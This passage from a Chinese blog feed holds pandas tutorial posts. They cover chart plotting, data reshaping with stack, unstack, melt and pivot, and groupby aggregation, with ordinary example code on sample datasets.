将折线图中折线与自变量坐标轴之间的区域使用颜色或者纹理填充，这样一个填充区域叫做面积，颜色的填充可以更好的突出趋势信息，需要注意的是颜色要带有一定的透明度，透明度可以很好的帮助使用者观察不同序列之间的重叠关系，没有透明度的面积会导致不同序列之间相互遮盖减少可以被观察到的信息。<br>面积图默认情况下是堆叠的。 要生成堆积面积图，每列必须全部为正值或全部为负值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df_staff.plot.area(x=<span class="string">'季度'</span>,y=[<span class="string">'张三'</span>,<span class="string">'李四'</span>,<span class="string">'王五'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/%E5%8C%BA%E5%9F%9F%E5%9B%BE.png" alt="区域图"></p><h3 id="d-饼状图"><a href="#d-饼状图" class="headerlink" title="d) 饼状图"></a>d) 饼状图</h3><p>饼图（Pie Chart）广泛得应用在各个领域，用于表示不同分类的占比情况，通过弧度大小来对比各种分类。饼图通过将一个圆饼按照分类的占比划分成多个区块，整个圆饼代表数据的总量，每个区块（圆弧）表示该分类占总体的比例大小，所有区块（圆弧）的加和等于 100%。<br>可以使用 DataFrame.plot.pie() 或 Series.plot.pie() 创建饼图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">df_staff</span><br><span class="line"><span class="comment">#看张三每个季度的业绩分布</span></span><br><span class="line">df_staff.plot.pie(y=<span class="string">'张三'</span>,subplots=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#看第一个季度，每个人的绩效分布</span></span><br><span class="line">df_staff1=df_staff.loc[<span class="number">0</span>:<span class="number">0</span>,<span class="string">'张三'</span>:<span class="string">'孙八'</span>].T</span><br><span class="line">df_staff1.columns=[<span class="string">'Q'</span>]</span><br><span class="line">df_staff1.plot.pie(y=<span class="string">'Q'</span>,subplots=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/%E9%A5%BC%E7%8A%B6%E5%9B%BE.png" alt="饼图"></p><h3 id="e-散点图"><a href="#e-散点图" class="headerlink" title="e) 散点图"></a>e) 散点图</h3><p>散点图（Scatter graph）也叫 X-Y 图，它将所有的数据以点的形式展现在直角坐标系上，以显示变量之间的相互影响程度，点的位置由变量的数值决定。<br>通过观察散点图上数据点的分布情况，我们可以推断出变量间的相关性。如果变量之间不存在相互关系，那么在散点图上就会表现为随机分布的离散的点，如果存在某种相关性，那么大部分的数据点就会相对密集并以某种趋势呈现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df1 = pd.DataFrame(np.random.rand(<span class="number">50</span>, <span class="number">4</span>), columns=[<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>, <span class="string">"d"</span>])</span><br><span class="line">df1.plot.scatter(x=<span class="string">"a"</span>, y=<span class="string">"b"</span>);</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/%E6%95%A3%E7%82%B9%E5%9B%BE.png" alt="散点图"></p><h3 id="f-直方图"><a href="#f-直方图" class="headerlink" title="f) 直方图"></a>f) 直方图</h3><p>直方图(Histogram)，又称质量分布图，是一种统计报告图，它是根据具体数据的分布情况，画成以组距为底边、以频数为高度的一系列连接起来的直方型矩形图。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/%E7%9B%B4%E6%96%B9%E5%9B%BE%E8%AF%B4%E6%98%8E.png" alt="直方图说明"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#构建数据集</span></span><br><span class="line">df4=pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">"a"</span>: np.random.randn(<span class="number">1000</span>) + <span class="number">1</span>,</span><br><span class="line">    <span class="string">"b"</span>: np.random.randn(<span class="number">1000</span>),</span><br><span class="line">    <span class="string">"c"</span>: np.random.randn(<span class="number">1000</span>) - <span class="number">1</span>,</span><br><span class="line">    <span class="string">"d"</span>: np.random.randn(<span class="number">1000</span>) - <span class="number">2</span>,</span><br><span class="line">    &#125;,columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">df4</span><br><span class="line">df4.plot.hist(alpha=<span class="number">0.5</span>)  <span class="comment">#指定图形透明度</span></span><br><span class="line">df4.plot.hist(stacked=<span class="literal">True</span>,bins=<span class="number">20</span>) <span class="comment">#堆叠并指定箱数为20</span></span><br><span class="line">df4.diff().hist() <span class="comment">#通过diff给每一列数据都绘制一个直方图</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220216/%E7%9B%B4%E6%96%B9%E5%9B%BE.png" alt="直方图"></p><p>至此，本文介绍了pandas常用的绘图组件matplotlib，包括mataplotlib绘图的基本构成，如何在windows下解决中文问题，并通过实例介绍了如何通过pandas的数据集绘制折线图、箱线图、柱状图、饼图、面积图、散点图、直方图等。</p><p>参考资料：《利用python进行数据分析》、pandas官网 user guide</p><p>数据集及源代码见：<a href="https://github.com/xiejava1018/pandastest.git" target="_blank" rel="noopener">https://github.com/xiejava1018/pandastest.git</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas数据分析之数据重塑透视(stack、unstack、melt、pivot)</title>
      <link href="/posts/bc5826bd/"/>
      <url>/posts/bc5826bd/</url>
      
        <content type="html"><![CDATA[<p>在数据分析的过程中，分析师常常希望通过多个维度多种方式来观察分析数据，重塑和透视是常用的手段。<br>数据的重塑简单说就是对原数据进行变形，为什么需要变形，因为当前数据的展示形式不是我们期望的维度，也可以说索引不符合我们的需求。对数据的重塑不是仅改变形状那么简单，在变形过程中，数据的内在数据意义不能变化，但数据的提示逻辑则发生了重大的改变。<br>数据透视是最常用的数据汇总工具，Excel 中经常会做数据透视，它可以根据一个或者多个指定的维度来聚合数据。pandas 也提供了数据透视函数来实现这些功能。<br>如果能熟练区分和使用各种重塑和透视分析方法，那用pandas处理分析日常的数据基本上就没有什么难度了。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/%E9%87%8D%E5%A1%91%E9%80%8F%E8%A7%86.png" alt="重塑和透视"></p><p>在介绍数据重塑透视之前，先来介绍一下pandas中DataFrame的层次化索引，它广泛应用于重塑透视操作。</p><h1 id="一、层次化索引"><a href="#一、层次化索引" class="headerlink" title="一、层次化索引"></a>一、层次化索引</h1><p>层次化索引是pandas的一项重要功能，它使你能在一个轴上拥有多个（两个以上）索引层数，分层索引的目的是用低维度的结构（Series 或者 DataFrame）更好地处理高维数据。通过分层索引，我们可以像处理二维数据一样，处理三维及以上的数据。分层索引的存在使得分析高维数据变得简单。<br>我们来看一下student数据集，并根据该数据集分别构建列和行的层次索引。然后再介绍数据的重塑和透视。<br>引入student数据集：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_excel(<span class="string">'D:\\Python\\study\\pythontest\\pandastest\\数据集\\student.xlsx'</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="student数据集"></p><p>该student数据集包含学生学号、姓名、语文、数据、英语的成绩等。</p><h2 id="1、列索引分层"><a href="#1、列索引分层" class="headerlink" title="1、列索引分层"></a>1、列索引分层</h2><p>我们选取一些关键的数据构建列标签的层次化索引。这里我们选取’班级’,’姓名’,’语文’,’数学’,’英语’的列，并且将‘班级’、‘姓名’标记为‘标识’，’语文’,’数学’,’英语’标记为‘成绩’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df_student=df[[<span class="string">'班级'</span>,<span class="string">'2-姓名'</span>,<span class="string">'4-语文'</span>,<span class="string">'5-数学'</span>,<span class="string">'6-英语'</span>]]</span><br><span class="line">df_student.columns=[[<span class="string">'标识'</span>,<span class="string">'标识'</span>,<span class="string">'成绩'</span>,<span class="string">'成绩'</span>,<span class="string">'成绩'</span>],[<span class="string">'班级'</span>,<span class="string">'姓名'</span>,<span class="string">'语文'</span>,<span class="string">'数学'</span>,<span class="string">'英语'</span>]]</span><br><span class="line">df_student</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/%E5%88%97%E7%B4%A2%E5%BC%95%E5%88%86%E5%B1%82.png" alt="列索引分层"><br>通过指定DataFrame的columns的层级将’班级’,’姓名’,’语文’,’数学’,’英语’，上多抽出了一个层级，这个层有两个索引一个是‘标识’，一个是成绩，其中‘班级’和‘名称’是属于标识，’语文’,’数学’,’英语’都是’成绩’。</p><h2 id="2、行索引分层"><a href="#2、行索引分层" class="headerlink" title="2、行索引分层"></a>2、行索引分层</h2><p>  接下来看行索引的分层。我们将属于一班的和属于二班的同学进行分层，再分成两个索引。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#根据行索引分层，设置行索引将其分成班级和姓名两个层次索引</span></span><br><span class="line">df_student=df_student.set_index([(<span class="string">'标识'</span>,<span class="string">'班级'</span>),(<span class="string">'标识'</span>,<span class="string">'姓名'</span>)])</span><br><span class="line">df_student.index.names=[<span class="string">'班级'</span>,<span class="string">'姓名'</span>]</span><br><span class="line">df_student</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/%E8%A1%8C%E7%B4%A2%E5%BC%95%E5%88%86%E5%B1%82.png" alt="行索引的分层"></p><p>可以看到将数据集的班级和姓名列分成了两个行的层级索引。没有用默认的0-9的行索引</p><h1 id="二、数据堆叠与拆堆"><a href="#二、数据堆叠与拆堆" class="headerlink" title="二、数据堆叠与拆堆"></a>二、数据堆叠与拆堆</h1><p>层次化索引为DataFrame数据的重排任务提供了一种具有良好一致性的方式，有许多用于重新排列表格数据的基础运算。这些函数也称作重塑（reshape）或轴向旋转（pivot）运算。<br>常见的数据重塑包括数据的堆叠 stack 和 取消堆叠 unstck</p><h2 id="1、数据堆叠-stack"><a href="#1、数据堆叠-stack" class="headerlink" title="1、数据堆叠 stack"></a>1、数据堆叠 stack</h2><p>堆叠 stack ，顾名思义，就是将列的数据堆叠形成行。<br>借用pandas官网的示意图：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/stack.png" alt="堆叠 stack"></p><p>看实际数据数据会更容易理解，为了方便我们取student数据集的前5行记录来进行数据堆叠stack()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">df_student[:<span class="number">5</span>]</span><br><span class="line"><span class="comment">#将数据进行堆叠</span></span><br><span class="line"><span class="comment">#将数据进行堆叠</span></span><br><span class="line">df_student5=df_student[:<span class="number">5</span>].stack()</span><br><span class="line">df_student5</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/stack1.png" alt="堆叠 stack(）"></p><p>在这里可以看到通过stack()将“语文”、“数学”、”英语”，三列，一个个堆叠形成一条记录的三行。这样列数减少了，行数增多了。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/stack2.png" alt="stack()"></p><p>对于多层索引，可以根据指定堆叠层次，默认是最高层次的堆叠。<br>我们来看指定堆叠层次，如果<code>stack(0)</code>，表示堆叠level0层的。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/stack3.png" alt="分层堆叠"></p><h2 id="2、取消堆叠-unstack"><a href="#2、取消堆叠-unstack" class="headerlink" title="2、取消堆叠 unstack"></a>2、取消堆叠 unstack</h2><p>取消堆叠 unstack是堆叠的反操作。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/unstack.png" alt="Unstack"></p><p>也就是将堆叠好了的行数据，一个个卸下来形成列。这样一来行数减少了，但是列数增多了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 取消堆叠 unstack()</span></span><br><span class="line">df_student5.unstack()</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/unstack1.png" alt="unstack"></p><p>可以看到原来的“语文”、“数学”、”英语”三行，通过unstack()进行拆堆，拆成了三列，明显数据没有那么高了，行数少了，列数多了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/unstack2.png" alt="unstack"></p><p>同样对于多层索引可以逐层拆堆<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/unstack3.png" alt="逐层拆堆"></p><h1 id="三、数据融合与透视"><a href="#三、数据融合与透视" class="headerlink" title="三、数据融合与透视"></a>三、数据融合与透视</h1><p>数据透视是最常用的数据汇总工具，它可以根据一个或者多个指定的维度来聚合数据。实际上搞懂了stack和unstack就很容易搞懂pivot和melt了，stack和unstack根据索引来进行堆叠和拆堆，pivot和melt可以根据指定的数据来进行变换操作灵活性更高。</p><h2 id="1、数据融合-melt"><a href="#1、数据融合-melt" class="headerlink" title="1、数据融合 melt"></a>1、数据融合 melt</h2><p>来看pandas官网的示意图，是不是和stack的图有点类似，都是将列转换成行，不同的是melt可以指定哪些列固定，哪些列转换成行等灵活性更高。简单说就是将指定的列放到铺开放到行上名为variable(可指定)列，值在value(可指定)列<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/melt.png" alt="melt"><br>melt语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pd.melt(frame: pandas.core.frame.DataFrame,</span><br><span class="line">        id_vars=<span class="literal">None</span>, value_vars=<span class="literal">None</span>,</span><br><span class="line">        var_name=<span class="string">'variable'</span>, value_name=<span class="string">'value'</span>,</span><br><span class="line">        col_level=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>id_varstuple，list或ndarray（可选），用作标识变量的列。</li><li>value_varstuple，列表或ndarray，可选，要取消透视的列。 如果未指定，则使用未设置为id_vars的所有列。</li><li>var_namescalar，用于“变量”列的名称。 如果为None，则使用frame.columns.name或“variable”。</li><li>value_namescalar，默认为“ value”，用于“ value”列的名称。<ul><li>col_levelint或str，可选，如果列是MultiIndex，则使用此级别来融化。</li></ul></li></ul><p>我们还是来看示例：<br>数据集还是student数据集，为了演示方便取前5条记录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df_student=df[[<span class="string">'班级'</span>,<span class="string">'2-姓名'</span>,<span class="string">'4-语文'</span>,<span class="string">'5-数学'</span>,<span class="string">'6-英语'</span>]]</span><br><span class="line">df_student.columns=[[<span class="string">'标识'</span>,<span class="string">'标识'</span>,<span class="string">'成绩'</span>,<span class="string">'成绩'</span>,<span class="string">'成绩'</span>],[<span class="string">'班级'</span>,<span class="string">'姓名'</span>,<span class="string">'语文'</span>,<span class="string">'数学'</span>,<span class="string">'英语'</span>]]</span><br><span class="line">df_student[<span class="number">0</span>:<span class="number">5</span>]</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/melt1.png" alt="melt"></p><p>现在将“班级”和“姓名”固定，’语文’,’数学’,’英语’三列转换成行融合为“学科”字段，这三个列的值定义为“分数”列。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将“班级”和“姓名”固定，'语文','数学','英语'三列转换成行融合为“学科”字段，这三个列的值定义为“分数”列</span></span><br><span class="line">df_student[<span class="number">0</span>:<span class="number">5</span>].melt(id_vars=[<span class="string">'班级'</span>,<span class="string">'姓名'</span>],</span><br><span class="line">                     value_vars=[<span class="string">'语文'</span>,<span class="string">'数学'</span>,<span class="string">'英语'</span>],</span><br><span class="line">                     var_name=<span class="string">'学科'</span>,</span><br><span class="line">                     value_name=<span class="string">'分数'</span>,col_level=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/melt2.png" alt="melt"><br>具体实现如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/melt3.png" alt="melt"></p><h2 id="2、数据透视-pivot"><a href="#2、数据透视-pivot" class="headerlink" title="2、数据透视 pivot"></a>2、数据透视 pivot</h2><p>来看pandas官网的示意图，是不是和unstack的图有点类似，将行数据转换成列。同样pivot提供了更多的参数可以指定相应的数据进行转换，比unstack更加灵活。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/pivot.png" alt="pivot"></p><p>这里有三个参数，作用分别是：</p><ul><li>index：新 df 的索引列，用于分组，如果为None，则使用现有索引 </li><li>columns：新 df 的列，如果透视后有重复值会报错</li><li>values：用于填充 df 的列。 如果未指定，将使用所有剩余的列，并且结果将具有按层次结构索引的列</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">df_student5=df_student[<span class="number">0</span>:<span class="number">5</span>].melt(id_vars=[<span class="string">'班级'</span>,<span class="string">'姓名'</span>],</span><br><span class="line">                     value_vars=[<span class="string">'语文'</span>,<span class="string">'数学'</span>,<span class="string">'英语'</span>],</span><br><span class="line">                     var_name=<span class="string">'学科'</span>,</span><br><span class="line">                     value_name=<span class="string">'分数'</span>,col_level=<span class="number">1</span>)</span><br><span class="line">df_student5</span><br><span class="line">df_student5.pivot(index=[<span class="string">'班级'</span>,<span class="string">'姓名'</span>],columns=<span class="string">'学科'</span>,values=<span class="string">'分数'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/pivot1.png" alt="pivot"></p><p>这里通过pivot将“学科”的行数据透视转换成“数学”、“英语”、“语文”三列，具体实现如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220214/pivot2.png" alt="privot"><br>可以看出privot实际和unstack类似是由行转换成列的视图，但比起unstack更加灵活。</p><p>至此，介绍了pandas的多层索引及pandas的4种重塑操作：<strong>stack、unstack、pivot、melt</strong>:<br><strong>stack、unstack是基础：stack实现列转行，unstack实现行转列</strong>。<br>melt与stack类似，比stack更加灵活。<br>pivot与unstack类似，比unstack更加灵活。</p><p>数据集及源代码见：<a href="https://github.com/xiejava1018/pandastest.git" target="_blank" rel="noopener">https://github.com/xiejava1018/pandastest.git</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas数据分析之分组聚合</title>
      <link href="/posts/dd24116d/"/>
      <url>/posts/dd24116d/</url>
      
        <content type="html"><![CDATA[<p>在数据分析过程中，经常会需要根据某一列或多列把数据划分为不同的组别，然后再对其进行数据分析。本文将介绍pandas的数据分组及分组后的应用如对数据进行聚合、转换和过滤。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E5%88%86%E7%BB%84%E8%81%9A%E5%90%88.png" alt="分组聚合"></p><p>在关系型数据库中我们常用SQL的GROUP BY操作进行分组分析计算。在pandas中要完成数据的分组操作同样可用groupby()函数，然后再在划分出来的组（group）上应用一些统计函数，从而达到数据分析的目的，比如对分组数据进行聚合、转换或者过滤。这个过程主要包含以下三步：<strong>拆分(split)-应用(apply)-合并(combine）</strong><br>例如，DataFrame可以在列(axis=1)或行(axis=0)上进行分组(split)，然后将一个函数应用(apply)到各个分组并产生一个新值，最后所有这些函数的执行结果会被合并(combine)到最终的结果对象中。<br>一个简单的分组聚合的过程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E5%88%86%E7%BB%84-%E5%BA%94%E7%94%A8-%E5%90%88%E5%B9%B6.png" alt="拆分(split)-应用(apply)-合并(combine）"></p><p>我们来构造图中所示的DataFrame数据集，看看pandas的分组聚合是怎么做的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">df=pd.DataFrame(&#123;<span class="string">'key'</span>:[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>],<span class="string">'data'</span>:[<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">20</span>]&#125;)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E6%95%B0%E6%8D%AE%E9%9B%86.png" alt="数据集"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grouped=df.groupby([<span class="string">'key'</span>]) <span class="comment">#通过key分组</span></span><br><span class="line"><span class="comment">#查看分组情况</span></span><br><span class="line"><span class="keyword">for</span> dtype,group <span class="keyword">in</span> grouped:</span><br><span class="line">    print(dtype)</span><br><span class="line">grouped.sum() <span class="comment">#对每个分组应用sum函数，并最后组合成结果</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/groupby.png" alt="对df的key进行用groupby()进行分组"><br>通过对df的key进行用groupby()进行分组，这里可看到，将数据分成了A、B、C三组，然后对这三组分别应用sum()函数求和，再组合成最终的结果。<br>对于分组聚合一般来说实际上是分两步：一是创建分组对象进行分组，二是对分组进行相应处理如（对组应用聚合函数、对组进行转换、对组的数据进行过滤）。不过实际在具体写的时候可以通过链式调用一个语句就可以实现如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.groupby([<span class="string">'key'</span>]).sum() <span class="comment">#链式调用先分组再用聚合函数聚合</span></span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/groupby%E5%8D%95key.png" alt="链式调用先分组再用聚合函数聚合"></p><h1 id="一、创建分组对象进行分组"><a href="#一、创建分组对象进行分组" class="headerlink" title="一、创建分组对象进行分组"></a>一、创建分组对象进行分组</h1><p>groupby可以把分组时指定的键（key）作为每组的组名。groupby对象支持迭代，可以遍历每个分组的具体数据。<br>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看分组情况</span></span><br><span class="line"><span class="keyword">for</span> name,group <span class="keyword">in</span> grouped:</span><br><span class="line">    print(name)</span><br><span class="line">    print(group)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E8%81%9A%E5%90%88%E6%95%B0%E6%8D%AE%E9%9B%86%E6%9F%A5%E7%9C%8B%E5%88%86%E7%BB%84%E6%83%85%E5%86%B5.png" alt="查看分组情况"></p><h2 id="1、根据多列进行分组"><a href="#1、根据多列进行分组" class="headerlink" title="1、根据多列进行分组"></a>1、根据多列进行分组</h2><p>groupby可以通过传入需要分组的参数实现对数据的分组，参数可以是单列，也可以是多列，多列以列表的方式传入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grouped=df.groupby([<span class="string">'key1'</span>,<span class="string">'key2'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/groupby%E5%A4%9A%E5%88%97%E5%88%86%E7%BB%84.png" alt="多列进行分组"></p><h2 id="2、通过字典或Series进行分组"><a href="#2、通过字典或Series进行分组" class="headerlink" title="2、通过字典或Series进行分组"></a>2、通过字典或Series进行分组</h2><p>除数组以外，分组信息还可以其他形式存在。如可以定义字典或Series进行分组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">people=pd.DataFrame(np.random.randn(<span class="number">5</span>,<span class="number">5</span>),</span><br><span class="line">                   columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>],</span><br><span class="line">                   index=[<span class="string">'Joe'</span>,<span class="string">'Steve'</span>,<span class="string">'Wes'</span>,<span class="string">'Jim'</span>,<span class="string">'Bob'</span>])</span><br><span class="line">people</span><br><span class="line">mapping=&#123;<span class="string">'a'</span>:<span class="string">'red'</span>,<span class="string">'b'</span>:<span class="string">'red'</span>,<span class="string">'c'</span>:<span class="string">'blue'</span>,<span class="string">'d'</span>:<span class="string">'blue'</span>,<span class="string">'e'</span>:<span class="string">'red'</span>&#125;<span class="comment">#定义分组字典</span></span><br><span class="line">by_column=people.groupby(mapping,axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#查看分组情况</span></span><br><span class="line"><span class="keyword">for</span> group_name,group_data <span class="keyword">in</span> by_column:</span><br><span class="line">    print(group_name)</span><br><span class="line">    print(group_data)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/groupbyserise%E5%88%86%E7%BB%84.png" alt="字典分组"></p><p>在字典中我们定义了<code>mapping={&#39;a&#39;:&#39;red&#39;,&#39;b&#39;:&#39;red&#39;,&#39;c&#39;:&#39;blue&#39;,&#39;d&#39;:&#39;blue&#39;,&#39;e&#39;:&#39;red&#39;}#定义分组字典</code><br>a、b、e对应“red”，c、d对应“blue”所以将blue和red分成了两组。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/%E5%AD%97%E5%85%B8%E5%88%86%E7%BB%84%E5%90%8E%E7%9A%84sum()%E8%81%9A%E5%90%88.png" alt="sum聚合"></p><p>应用sum()求和函数，可以看到分别对blue和red的分组进行了求和。<br>类似的，Series也是一样的，我们将map转换成Series，可以看到分组结果和map分组一样的。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220212/groupbyserise%E5%88%86%E7%BB%84.png" alt="Series分组"></p><h2 id="3、通过函数进行分组"><a href="#3、通过函数进行分组" class="headerlink" title="3、通过函数进行分组"></a>3、通过函数进行分组</h2><p>比起使用字典或Series,使用Python函数是一种更原生的方法定义分组映射，。任何被当做分组键的函数都会在各个索引值上被调用一次，其返回值就会被用作分组名称。<br>如上面的people数据集，将姓名索引的长度进行分组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 